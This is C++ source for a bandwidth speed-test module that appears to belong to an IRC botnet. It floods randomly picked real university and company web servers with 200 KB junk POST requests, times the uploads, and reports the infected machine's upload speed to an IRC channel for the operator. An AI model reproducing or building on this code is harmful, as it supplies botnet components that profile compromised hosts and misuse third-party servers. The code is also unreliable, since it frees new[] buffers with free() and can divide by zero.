#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_SPEEDTEST

#define NUM_KILOBYTES 200

int randnum(int range) { srand(GetTickCount()); return (rand() % range); }

// Return speed to host:80 in kbit per second
unsigned long GetSpeed(char *szHost) {
	if(strlen(szHost) > MAXHOSTNAME) return 0;
	unsigned long lBufSize=NUM_KILOBYTES*1024;
	SOCKET sSock;
	SOCKADDR_IN ssin;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	if ((ssin.sin_addr.s_addr = ResolveAddress(szHost)) == 0) return 0;
	ssin.sin_port = fhtons(80);

	if ((sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return 0;
	if (fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return 0;

	char *szBuf=new char[lBufSize+3];

	srand(GetTickCount());
	int iChar=(char)(rand() % 255);
	memset(szBuf,	0,		lBufSize+1	);
	memset(szBuf,	iChar,	lBufSize	);

	unsigned long lStrLen=strlen(szBuf);

	char *szPostReq=new char[lBufSize+1002];
	sprintf(szPostReq, "POST / HTTP/1.0\r\n"
		"Host: %s\r\n"
		"Content-Length: %d\r\n"
		"\r\n",
		szHost, lStrLen);
	strcat(szPostReq, szBuf);
	strcat(szPostReq, "\r\n");
	
	lStrLen=strlen(szPostReq);

	unsigned long lStartMS=GetTickCount();

	for(unsigned long l=0; l<lStrLen; l+=1024) {
		if(lStrLen-l < 1024) {
			if(fsend(sSock, szPostReq+l, lStrLen-l,0) == SOCKET_ERROR) { 
				fclosesocket(sSock);
				free(szBuf); 
				free(szPostReq);
				return 0; 
			}
		} else {
			if(fsend(sSock, szPostReq+l, 1024,0) == SOCKET_ERROR) { 
				fclosesocket(sSock);
				free(szBuf); 
				free(szPostReq);
				return 0; 
			}
		}
	}

	unsigned long lEndMS=GetTickCount();

	float fElapsedS=(float)(lEndMS-lStartMS)/1000.0f;
	if(fElapsedS==0.0f) fElapsedS=1.0f;

	float fBytesPS=(float)lStrLen/fElapsedS;	// Get bytes per second
	float fKBytesPS=fBytesPS/1024.0f;			// Get kilobytes per second
	float fBitsPS=fBytesPS*8.0f;				// Get bits per second
	float fKBitsPS=fBitsPS/1024.0f;				// Get kilobits per se

	fclosesocket(sSock);
	free(szBuf); 
	free(szPostReq);

	return (unsigned long)fKBitsPS;
}

void DoSpeedTest(SOCKET sock, char chan[MAXCHANLEN], BOOL notice) {
	unsigned long lProbe1=0, lProbe2=0;
	int iDivide=3;
	char sendbuf[IRCLINE];

	char *EU[] = {
		"www.schlund.net",
		"www.utwente.nl",
		"verio.fr",
		"www.1und1.de",
		"www.switch.ch",
		"www.belwue.de",
		"de.yahoo.com",
		"www.google.it"
	};
	char *US[] = {
		"www.xo.net",
		"www.stanford.edu",
		"www.verio.com",
		"www.nocster.com",
		"www.rit.edu",
		"www.cogentco.com",
		"www.burst.net",
		"nitro.ucsc.edu",
		"www.level3.com",
		"www.above.net",
		"www.easynews.com",
		"www.google.com"
	};
	char *ASIA[] = {
		"www.lib.nthu.edu.tw",
		"www.st.lib.keio.ac.jp",
		"www.d1asia.com",
		"www.nifty.com",
		"yahoo.co.jp",
		"www.google.co.jp"
	};

	// EU
	lProbe1=GetSpeed(EU[randnum(sizeof(EU)/sizeof(LPTSTR))]);
	lProbe2=GetSpeed(EU[randnum(sizeof(EU)/sizeof(LPTSTR))]);
	unsigned long lEUSpeed=0;
	if (lProbe1 && lProbe2) lEUSpeed=(lProbe1+lProbe2)/2;
	else { if (lProbe1) lEUSpeed=lProbe1; else lEUSpeed=lProbe2; }

	// US
	unsigned long lUSSpeed=0;
	lProbe1=GetSpeed(US[randnum(sizeof(US)/sizeof(LPTSTR))]);
	lProbe2=GetSpeed(US[randnum(sizeof(US)/sizeof(LPTSTR))]);
	if (lProbe1 && lProbe2) lUSSpeed=(lProbe1+lProbe2)/2;
	else { if (lProbe1) lUSSpeed=lProbe1; else lUSSpeed=lProbe2; }

	// ASIA
	lProbe1=GetSpeed(ASIA[randnum(sizeof(ASIA)/sizeof(LPTSTR))]);
	lProbe2=GetSpeed(ASIA[randnum(sizeof(ASIA)/sizeof(LPTSTR))]);
	unsigned long lASIASpeed=0;
	if (lProbe1 && lProbe2) lASIASpeed=(lProbe1+lProbe2)/2;
	else { if (lProbe1) lASIASpeed=lProbe1; else lASIASpeed=lProbe2; }

	unsigned long lTotalSpeed=0;
	if (lEUSpeed) lTotalSpeed=lEUSpeed; else iDivide--;
	if (lUSSpeed) lTotalSpeed+=lUSSpeed; else iDivide--;
	if (lASIASpeed) lTotalSpeed+=lASIASpeed; else iDivide--;
	lTotalSpeed=lTotalSpeed/iDivide;
	sprintf(sendbuf, "[SPEEDTEST]: Europe[%d kbit/s] USA[%d kbit/s] Asia[%d kbit/s] Average[%d kbit/s]",
		lEUSpeed, lUSSpeed, 
		lASIASpeed, lTotalSpeed);

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}
#endif